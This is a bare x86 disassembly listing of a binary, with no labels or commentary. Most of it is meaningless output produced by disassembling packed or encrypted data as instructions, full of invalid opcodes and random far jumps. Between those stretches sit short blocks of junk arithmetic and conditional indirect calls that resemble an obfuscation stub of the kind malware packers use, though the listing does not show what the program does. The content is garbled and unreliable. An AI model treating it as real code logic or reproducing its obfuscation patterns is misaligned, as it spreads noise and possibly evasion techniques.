  42016a:	mov    bh,0x60
  42016c:	sbb    eax,0x86128491
  420171:	jge    0x420146
  420173:	js     0x42017a
  420175:	pusha  
  420176:	cli    
  420177:	cmp    al,0xac
  420179:	push   eax
  42017a:	push   ebx
  42017b:	push   0xbf4faf2a
  420180:	cwde   
  420181:	add    al,0x44
  420183:	shr    edx,cl
  420185:	test   edx,edx
  420187:	jmp    0xa1c9:0x80f229f6
  42018e:	mov    dl,0xea
  420190:	(bad)  
  420191:	jno    0x42016f
  420193:	test   al,0xe0
  420195:	mov    cl,BYTE PTR [ebx]
  420197:	or     DWORD PTR [ecx+ebx*2],esi
  42019a:	mov    eax,ds:0xcdbc37d4
  42019f:	add    cl,BYTE PTR [ebp-0x2c]
  4201a2:	mov    edi,0xf84516d
  4201a7:	les    edi,FWORD PTR [ebx]
  4201a9:	xor    al,0x47
  4201ab:	push   ebp
  4201ac:	loopne 0x420187
  4201ae:	cli    
  4201af:	cli    
  4201b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201b1:	jo     0x4201c5
  4201b3:	outs   dx,BYTE PTR ds:[esi]
  4201b4:	jmp    0x81bfb7df
  4201b9:	cwde   
  4201ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201bb:	sub    esp,0x70386cf3
  4201c1:	jnp    0x42021e
  4201c3:	jbe    0x420186
  4201c5:	sub    DWORD PTR [ecx+0x54],edi
  4201c8:	dec    ebp
  4201c9:	loope  0x4201a2
  4201cb:	jp     0x42017f
  4201cd:	mov    ah,0xcf
  4201cf:	xor    al,bh
  4201d1:	test   eax,0x206c1dab
  4201d6:	sbb    esi,DWORD PTR [edx-0x4]
  4201d9:	das    
  4201da:	popa   
  4201db:	pop    esp
  4201dc:	repnz pop esp
  4201de:	sbb    al,0x12
  4201e0:	pop    esi
  4201e1:	cmp    eax,0xea1c4d3f
  4201e6:	mov    eax,ds:0x72bcf302
  4201eb:	fadd   DWORD PTR [ebp+0x45]
  4201ee:	adc    al,0x94
  4201f0:	pop    ss
  4201f1:	imul   DWORD PTR [esi-0x616a7aa4]
  4201f7:	setl   BYTE PTR [edx-0x6e]
  4201fb:	sbb    BYTE PTR [esp+edi*8-0x75],bl
  4201ff:	push   esp
  420200:	and    al,0x22
  420202:	push   ds
  420203:	fmul   DWORD PTR [edi+0x5ef8540f]
  420209:	lock inc ecx
  42020b:	je     0x4201b5
  42020d:	inc    ebx
  42020e:	(bad)  
  420210:	or     ecx,DWORD PTR [ebx+0x64]
  420213:	mov    cl,0xdc
  420215:	mov    fs,WORD PTR [eax+0x1c4ddbdf]
  42021b:	jl     0x420252
  42021d:	shl    DWORD PTR [edx-0x4a36fe0f],0xa3
  420224:	jo     0x4201b0
  420226:	xchg   ebx,eax
  420227:	arpl   WORD PTR [edi+0x21],sp
  42022a:	ud1    esp,eax
  42022d:	arpl   WORD PTR [esi],di
  42022f:	je     0x42020a
  420231:	daa    
  420232:	add    ah,BYTE PTR [ebp+0x353a68bd]
  420238:	pop    ebp
  420239:	hlt    
  42023a:	adc    dl,BYTE PTR ds:0xf90242d9
  420240:	cmovs  ebp,DWORD PTR [eax+0x6494e1bf]
  420247:	test   eax,0xd87e069
  42024c:	iret   
  42024d:	(bad)  
  42024e:	jno    0x420240
  420250:	sbb    cl,BYTE PTR [ebx]
  420252:	(bad)  
  420254:	xor    DWORD PTR [ebx],edx
  420256:	xor    dh,bh
  420258:	lods   eax,DWORD PTR ds:[esi]
  420259:	or     bh,BYTE PTR [esi+0x2bd33150]
  42025f:	push   ss
  420260:	adc    eax,0x4c773252
  420265:	push   ebx
  420266:	mov    dh,dh
  420268:	das    
  420269:	js     0x42028e
  42026b:	pop    esi
  42026c:	js     0x420253
  42026e:	aad    0x75
  420270:	mov    cl,0x74
  420272:	adc    ebp,esi
  420274:	or     ch,bh
  420276:	adc    BYTE PTR [eax+0x6e],ch
  420279:	mov    al,BYTE PTR [edx]
  42027b:	push   ds
  42027c:	sar    BYTE PTR [ecx+0x1bef390f],1
  420282:	shl    BYTE PTR [edi],0xcf
  420285:	cli    
  420286:	xlat   BYTE PTR ds:[ebx]
  420287:	cmp    bh,BYTE PTR [ebx+eiz*4+0x53]
  42028b:	mov    al,ds:0x3c426e1f
  420290:	push   esi
  420291:	or     bh,BYTE PTR [ecx+0x5de1fef5]
  420297:	clc    
  420298:	jecxz  0x420310
  42029a:	lea    edx,[ebp+ebx*4-0x72740602]
  4202a1:	in     al,dx
  4202a2:	(bad)  
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ecx+0x4282df0d]
  4202aa:	add    BYTE PTR [ebx-0x7d],bl
  4202ad:	inc    edx
  4202ae:	add    BYTE PTR [ebx],ch
  4202b0:	ror    DWORD PTR [ebx+0x4283d70d],0x0
  4202b7:	add    DWORD PTR ds:0x42835f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x4283db,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x4281b7,0x4282d7
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x4283cb,0x4281af
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x4282c3,0x42827b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42835b,0x0
  42030c:	mov    DWORD PTR ds:0x4282b3,edx
  420312:	mov    esi,DWORD PTR ds:0x42827b
  420318:	mov    DWORD PTR ds:0x428357,ebx
  42031e:	mov    DWORD PTR ds:0x428367,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x4281d3,0x3019
  420337:	not    DWORD PTR ds:0x42835b
  42033d:	cmp    DWORD PTR ds:0x42835b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x4283bb
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428f0c
  420363:	adc    ecx,DWORD PTR ds:0x428293
  420369:	xor    DWORD PTR ds:0x42834f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42826b
  420377:	mov    esi,DWORD PTR ds:0x428323
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x4281d7,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42834b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x4283c7,0x0
  4203b4:	mov    DWORD PTR ds:0x4282ef,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281eb
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x4282af,0x2dc
  4203d5:	mov    DWORD PTR ds:0x4282ab,edi
  4203db:	cmp    DWORD PTR ds:0x4283c7,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x42803f
  4203ed:	call   DWORD PTR ds:0x428f10
  4203f3:	movzx  esi,WORD PTR ds:0x4281c7
  4203fa:	add    DWORD PTR ds:0x428347,esi
  420400:	adc    DWORD PTR ds:0x4281e7,ebx
  420406:	add    DWORD PTR ds:0x4283c3,0x22a2
  420410:	and    esi,DWORD PTR ds:0x4283c3
  420416:	or     DWORD PTR ds:0x4283bf,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428343
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x4282c3,0x0
  42042e:	mov    DWORD PTR ds:0x4283c3,0x5615
  420438:	mov    DWORD PTR ds:0x4281bb,0x419b
  420442:	mov    DWORD PTR ds:0x4281df,0x389d
  42044c:	not    DWORD PTR ds:0x4282b3
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x4282c3,0x0
  420463:	je     0x4204a0
  420469:	push   0x42828f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428f14
  420477:	sub    DWORD PTR ds:0x428347,0x6950
  420481:	movzx  esi,WORD PTR ds:0x4282bb
  420488:	xor    esi,DWORD PTR ds:0x42836b
  42048e:	mov    DWORD PTR ds:0x4282bb,esi
  420494:	mov    esi,DWORD PTR ds:0x4282a3
  42049a:	or     DWORD PTR ds:0x42833f,esi
  4204a0:	xor    DWORD PTR ds:0x42836f,ecx
  4204a6:	add    DWORD PTR ds:0x42836f,ebx
  4204ac:	or     DWORD PTR ds:0x4283c7,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x4281db,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x4281bf,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283f7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x4281db,0x0
  420500:	mov    DWORD PTR ds:0x428343,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x4282df
  42051b:	cmp    DWORD PTR ds:0x4281db,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428f18
  420543:	mov    esi,DWORD PTR ds:0x4281cb
  420549:	sbb    DWORD PTR ds:0x4281e7,esi
  42054f:	and    DWORD PTR ds:0x4282e3,edx
  420555:	sbb    DWORD PTR ds:0x428297,edx
  42055b:	mov    esi,DWORD PTR ds:0x4283cf
  420561:	or     DWORD PTR ds:0x4283d3,esi
  420567:	mov    esi,DWORD PTR ds:0x4281f7
  42056d:	mov    edx,DWORD PTR ds:0x42838f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x4283cf,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x4281c3,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283e7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428283,0x2222
  4205bd:	not    DWORD PTR ds:0x428293
  4205c3:	cmp    DWORD PTR ds:0x4281c3,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283ef
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e9c
  4205e8:	xor    edx,DWORD PTR ds:0x428297
  4205ee:	mov    ecx,DWORD PTR ds:0x42827f
  4205f4:	or     DWORD PTR ds:0x4281af,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428323
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283eb,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x4282cb
  42061a:	xor    DWORD PTR ds:0x4282b7,edx
  420620:	movzx  ecx,WORD PTR ds:0x4282a3
  420627:	and    ecx,DWORD PTR ds:0x4283db
  42062d:	mov    DWORD PTR ds:0x4282a3,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283ef,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	mov    al,ds:0xacaae354
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	popa   
  42067b:	lock inc edi
  42067d:	sub    ebp,ebx
  42067f:	(bad)  
  420680:	out    dx,al
  420681:	cdq    
  420682:	adc    bl,bl
  420684:	test   al,0xe3
  420686:	cmp    esi,DWORD PTR [ebx-0x1f]
  420689:	jmp    0xf1256c28
  42068e:	nop
  42068f:	fmulp  st(3),st
  420691:	lods   eax,DWORD PTR ds:[esi]
  420692:	imul   ecx,ebx,0x4cf83081
  420698:	and    al,0xb3
  42069a:	mov    al,0x41
  42069c:	sub    eax,0x4b816ca3
  4206a1:	dec    esi
  4206a2:	push   ebx
  4206a3:	mov    bh,BYTE PTR [esi-0x321193ed]
  4206a9:	jmp    DWORD PTR [edi]
  4206ab:	push   cs
  4206ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ad:	mov    ebx,0x9ba733da
  4206b2:	dec    eax
  4206b3:	jae    0x420725
  4206b5:	nop
  4206b6:	mov    ds:0x9975dc28,al
  4206bb:	push   cs
  4206bc:	jno    0x420670
  4206be:	aas    
  4206bf:	adc    eax,0x2f99239e
  4206c4:	(bad)  
  4206c5:	dec    esp
  4206c6:	mov    cl,0x6c
  4206c8:	cmp    al,0xde
  4206ca:	mov    esi,0xf5f9a279
  4206cf:	jmp    0x420676
  4206d1:	fidivr WORD PTR [eax]
  4206d3:	dec    ebp
  4206d4:	or     esi,edx
  4206d6:	xor    ebx,0x7
  4206d9:	xchg   ebp,eax
  4206da:	das    
  4206db:	fwait
  4206dc:	test   al,0x53
  4206de:	xchg   edx,eax
  4206df:	test   DWORD PTR [ebp+edx*2+0x2e],edi
  4206e3:	push   0xd6d52256
  4206e8:	push   0xffffffe0
  4206ea:	mov    al,ds:0x468647ea
  4206f0:	pop    esi
  4206f1:	and    DWORD PTR [ecx+eiz*2+0x6c],0xffffff83
  4206f6:	cmp    eax,0x5af875c9
  4206fb:	and    ah,BYTE PTR ds:0xf4e705a2
  420701:	and    ecx,DWORD PTR [esi+0x14e6cf3a]
  420707:	retf   0x89ad
  42070a:	cs or  al,0x1b
  42070d:	push   ds
  42070e:	aaa    
  42070f:	jge    0x4206e3
  420711:	inc    ebp
  420712:	retf   
  420713:	imul   ebp,ebp,0x28cc4a4
  420719:	scas   al,BYTE PTR es:[edi]
  42071a:	push   esi
  42071b:	sub    al,0xa6
  42071d:	rol    dl,1
  42071f:	cmp    al,0x62
  420721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420722:	in     al,dx
  420723:	les    edi,FWORD PTR [ecx-0x52724c03]
  420729:	and    ecx,eax
  42072b:	sub    bh,bh
  42072d:	mov    eax,ds:0x7dbf48b
  420732:	js     0x4206d7
  420734:	je     0x420713
  420736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420737:	aas    
  420738:	pusha  
  420739:	push   ecx
  42073a:	in     eax,dx
  42073b:	bound  ebp,QWORD PTR [ebp-0x30]
  42073e:	mov    eax,ds:0xea685282
  420743:	jmp    0x88f1d2a2
  420748:	xchg   esi,eax
  420749:	sub    esi,esp
  42074b:	(bad)  
  42074c:	sbb    ebp,esp
  42074e:	iret   
  42074f:	cld    
  420750:	jg     0x4207b7
  420752:	outs   dx,BYTE PTR ds:[esi]
  420753:	adc    ebx,DWORD PTR [edx]
  420755:	fs jge 0x4207d7
  420758:	mov    ebx,0xbf7eccb7
  42075d:	icebp  
  42075e:	mov    BYTE PTR [edx],dl
  420760:	jl     0x420715
  420762:	ret    
  420763:	xor    BYTE PTR [ebx],dh
  420765:	scas   eax,DWORD PTR es:[edi]
  420766:	(bad)  
  420767:	push   esp
  420768:	cmp    ch,BYTE PTR fs:[edx+0x9ff13fa]
  42076f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420770:	inc    ecx
  420771:	cmp    bl,BYTE PTR [ebp+0x34e9d204]
  420777:	xchg   edi,eax
  420778:	jp     0x420786
  42077a:	cs mov al,0x67
  42077d:	dec    esp
  42077e:	mov    ch,al
  420780:	jae    0x42074d
  420782:	repnz or DWORD PTR [esi],eax
  420785:	pop    ebp
  420786:	sub    DWORD PTR [ecx+0x5a],ebp
  420789:	mov    dl,0x24
  42078b:	push   eax
  42078c:	xchg   ebp,eax
  42078d:	pop    ebp
  42078e:	mov    eax,0x5eb8cf3a
  420793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420794:	jl     0x4207f1
  420796:	imul   edi,DWORD PTR [edx-0x789723d7],0x3a
  42079d:	and    ecx,0xfffffff2
  4207a0:	les    ebp,FWORD PTR [ebx]
  4207a2:	pand   mm5,QWORD PTR [eax]
  4207a5:	inc    edi
  4207a6:	mov    dl,0x3c
  4207a8:	rcl    BYTE PTR [ebx+0x7],0x55
  4207ac:	mov    ah,0x36
  4207ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207af:	xchg   esi,eax
  4207b0:	or     ch,ch
  4207b2:	sbb    eax,eax
  4207b4:	fwait
  4207b5:	mov    edi,0x1a8aa749
  4207ba:	mov    al,ds:0x4808b4a
  4207bf:	and    dh,cl
  4207c1:	inc    esi
  4207c2:	sub    BYTE PTR [ebx-0x47],dl
  4207c5:	(bad)  
  4207c6:	call   0xe9e8:0x50f434f8
  4207cd:	cmp    ah,BYTE PTR [edi+0x595558e9]
  4207d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d4:	mov    bh,0x69
  4207d6:	sub    edx,esp
  4207d8:	jns    0x42076c
  4207da:	cs add eax,0xc3f2b1b2
  4207e0:	pop    edi
  4207e1:	xchg   ebx,esp
  4207e3:	inc    eax
  4207e4:	adc    edx,ebx
  4207e6:	push   ds
  4207e7:	popa   
  4207e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207e9:	sbb    eax,0x26e26e51
  4207ee:	stos   BYTE PTR es:[edi],al
  4207ef:	bound  ebx,QWORD PTR [ebp+0x30]
  4207f2:	mov    dh,0xf8
  4207f4:	or     DWORD PTR [esi+0x37],ecx
  4207f7:	shl    BYTE PTR [esi-0x6a],cl
  4207fa:	mov    esp,0xbdadcbf4
  4207ff:	pop    ss
  420800:	call   0x1e73:0x78567120
  420807:	push   ecx
  420808:	jnp    0x4207f5
  42080a:	adc    eax,0x6e3b4d41
  420810:	adc    eax,0xa38497b0
  420815:	cs pop eax
  420817:	in     al,dx
  420818:	loope  0x420834
  42081a:	int    0xc1
  42081c:	clc    
  42081d:	mov    ds:0xf5a81d0b,eax
  420822:	inc    edx
  420823:	outs   dx,BYTE PTR ds:[esi]
  420824:	pop    edi
  420825:	dec    esi
  420826:	das    
  420827:	push   es
  420828:	xchg   DWORD PTR [esi-0x56],edx
  42082b:	dec    edi
  42082c:	(bad)
  42082f:	out    dx,al
  420830:	lahf   
  420831:	lea    esp,[edi-0x69f4dc21]
  420837:	call   0x2654:0x559d3679
  42083e:	stos   BYTE PTR es:[edi],al
  42083f:	and    eax,DWORD PTR [ebx]
  420841:	fst    QWORD PTR [eax]
  420843:	mov    WORD PTR ds:0xf460301d,?
  420849:	sbb    DWORD PTR [eax],edx
  42084b:	jecxz  0x4207ce
  42084d:	or     eax,0x6b4b582a
  420852:	in     al,dx
  420853:	stos   DWORD PTR es:[edi],eax
  420854:	out    dx,eax
  420855:	sbb    eax,0xd9a31080
  42085a:	outs   dx,DWORD PTR ds:[esi]
  42085b:	sub    al,0xcb
  42085d:	fcom   QWORD PTR [edx+0x2028fd7d]
  420863:	shl    ch,1
  420865:	inc    edx
  420866:	aaa    
  420867:	inc    esi
  420868:	scas   al,BYTE PTR es:[edi]
  420869:	aaa    
  42086a:	out    0xc2,eax
  42086c:	addr16 pop ebp
  42086e:	dec    esp
  42086f:	pop    eax
  420870:	ins    DWORD PTR es:[edi],dx
  420871:	inc    edi
  420872:	pusha  
  420873:	push   0xffffffb9
  420875:	or     al,0xf9
  420877:	test   eax,0x3e982e57
  42087c:	imul   ebp,DWORD PTR [eax-0x34],0x77
  420880:	stos   BYTE PTR es:[edi],al
  420881:	ficom  DWORD PTR [ebx]
  420883:	mov    edx,0x482ab69f
  420888:	sbb    esp,ebp
  42088a:	sub    dl,ah
  42088c:	je     0x4208d6
  42088e:	test   eax,0xbd07077d
  420893:	bound  ebp,QWORD PTR [eax]
  420895:	or     eax,0xbe367659
  42089a:	and    ch,BYTE PTR [ebx+ebp*1]
  42089d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089e:	adc    eax,0xc340aea8
  4208a3:	sbb    eax,0x8ec75862
  4208a8:	pop    ebp
  4208a9:	jmp    0x4208ab
  4208ab:	outs   dx,DWORD PTR ds:[esi]
  4208ac:	dec    ebp
  4208ad:	xchg   esp,eax
  4208ae:	js     0x420878
  4208b0:	popa   
  4208b1:	dec    edx
  4208b2:	mov    ebx,0xc9a3ee51
  4208b7:	jo     0x4208cf
  4208b9:	sub    ebx,esp
  4208bb:	loope  0x4208f8
  4208bd:	mov    dh,bl
  4208bf:	push   es
  4208c0:	je     0x4208c3
  4208c2:	cmp    ch,BYTE PTR [ebp+0x56]
  4208c5:	inc    ebx
  4208c6:	and    eax,0x15a5660b
  4208cb:	(bad)  
  4208cd:	out    dx,al
  4208ce:	js     0x4208d3
  4208d0:	pop    ebx
  4208d1:	sub    eax,esp
  4208d3:	mov    ecx,0x58a955bd
  4208d8:	inc    ebp
  4208d9:	div    DWORD PTR [edx+0x450b97e6]
  4208df:	nop
  4208e0:	dec    ebp
  4208e1:	fsubr  QWORD PTR [edx-0x4]
  4208e4:	pop    eax
  4208e5:	cdq    
  4208e6:	jmp    0xeea1fd25
  4208eb:	or     BYTE PTR [edi+edx*8-0x23a7e4a9],ah
  4208f2:	nop
  4208f3:	test   ch,ah
  4208f5:	retf   0xbb9b
  4208f8:	push   ebp
  4208f9:	cmp    al,0x5c
  4208fb:	jmp    0x4208b1
  4208fd:	test   eax,0x7b34fa52
  420902:	adc    al,0x71
  420904:	retf   
  420905:	dec    esp
  420906:	test   DWORD PTR [ecx-0x6],ecx
  420909:	int    0x2b
  42090b:	adc    DWORD PTR [ecx+0x1930dfab],0x2cc0dea8
  420915:	xchg   bl,ah
  420917:	jg     0x420910
  420919:	mov    ecx,0xa8c00a73
  42091e:	scas   al,BYTE PTR es:[edi]
  42091f:	pop    eax
  420920:	sbb    DWORD PTR [ecx+0x68],ebx
  420923:	daa    
  420924:	enter  0xcb4a,0xf1
  420928:	mov    dh,0xaa
  42092a:	sbb    esi,DWORD PTR [ecx+0x4e669f78]
  420930:	fisubr WORD PTR [ebx+eax*2-0x471fbac7]
  420937:	es std 
  420939:	or     bh,bh
  42093b:	xchg   DWORD PTR [esi-0xb],eax
  42093e:	xlat   BYTE PTR ds:[ebx]
  42093f:	stos   DWORD PTR es:[edi],eax
  420940:	jmp    0x541e:0x696f0d5e
  420947:	mov    esp,0xa1e73d63
  42094c:	iret   
  42094d:	ins    BYTE PTR es:[edi],dx
  42094e:	pushf  
  42094f:	out    0xd1,eax
  420951:	jb     0x4208ef
  420953:	out    0xd9,al
  420955:	stos   DWORD PTR es:[edi],eax
  420956:	or     edx,DWORD PTR [ecx-0x73ac265d]
  42095c:	gs es xchg esp,eax
  42095f:	in     eax,dx
  420960:	pop    eax
  420961:	cwde   
  420962:	add    bh,bl
  420964:	sti    
  420965:	or     eax,0x98515091
  42096a:	mov    ebx,0x1cf38ef5
  42096f:	int    0xe4
  420971:	pop    esp
  420972:	ds icebp 
  420974:	aad    0x64
  420976:	or     BYTE PTR [esi+edx*2-0x55],ah
  42097a:	enter  0xc33a,0x69
  42097e:	cli    
  42097f:	xchg   ebx,eax
  420980:	push   eax
  420981:	les    esp,FWORD PTR [edi-0xb56a38c]
  420987:	arpl   WORD PTR [eax+0x42],si
  42098a:	or     eax,0x3b7c7c08
  42098f:	das    
  420990:	test   eax,0x3dd52a91
  420995:	or     esp,DWORD PTR [edi]
  420997:	cmp    DWORD PTR [eax],esp
  420999:	adc    ebx,DWORD PTR [edi]
  42099b:	inc    eax
  42099c:	in     eax,dx
  42099d:	fdiv   DWORD PTR [ecx]
  42099f:	mov    ecx,0x956635c8
  4209a4:	sbb    ch,BYTE PTR [eax-0x51]
  4209a7:	inc    ecx
  4209a8:	cmp    eax,0x407a5627
  4209ad:	jnp    0x42096f
  4209af:	add    eax,ebp
  4209b1:	stos   BYTE PTR es:[edi],al
  4209b2:	fnsave [ecx+ebx*4-0x27]
  4209b6:	mov    cl,al
  4209b8:	sbb    eax,edi
  4209ba:	test   DWORD PTR [edi+edi*8-0x1],ebp
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x4282b3
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42834f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428377,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42828f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x4281bb,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283f3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428377,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428ea0
  420a34:	sub    DWORD PTR ds:0x42834b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42827f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x4282db
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42834b
  420a66:	sub    DWORD PTR ds:0x42835f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x4281bf
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x4282d3,0x0
  420a81:	mov    DWORD PTR ds:0x42833b,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428373
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x4282bb,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x4282d3,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428ea4
  420abd:	mov    esi,DWORD PTR ds:0x4283bb
  420ac3:	or     DWORD PTR ds:0x4282e3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281f3
  420ad1:	mov    esi,DWORD PTR ds:0x428437
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x4281bb
  420ae2:	or     DWORD PTR ds:0x4282e3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428343,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x65
  420b0e:	jae    0x420b2d
  420b10:	jle    0x420b48
  420b12:	pop    ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x71e7e7ee],ah
  420b1a:	jb     0x420b36
  420b1c:	test   DWORD PTR [ebx+0x254ddf09],0x37f5b862
  420b26:	jp     0x420b86
  420b28:	imul   ebp,edx,0x3d
  420b2b:	(bad)  
  420b2c:	mov    cl,0x9f
  420b2e:	jge    0x420b60
  420b30:	pop    ebx
  420b31:	lahf   
  420b32:	push   cs
  420b33:	inc    edi
  420b34:	sbb    eax,esi
  420b36:	inc    ebp
  420b37:	icebp  
  420b38:	add    edx,DWORD PTR [edx]
  420b3a:	cld    
  420b3b:	stos   BYTE PTR es:[edi],al
  420b3c:	fsub   DWORD PTR [edx+0x237e35ba]
  420b42:	jl     0x420b3a
  420b44:	inc    esi
  420b45:	or     eax,0x8211ce35
  420b4a:	stos   BYTE PTR es:[edi],al
  420b4b:	dec    ebx
  420b4c:	fcmovbe st,st(3)
  420b4e:	xor    BYTE PTR [esp+esi*1-0x7559452f],al
  420b55:	ds add eax,0xbe266f1e
  420b5b:	mov    al,0xbe
  420b5d:	push   es
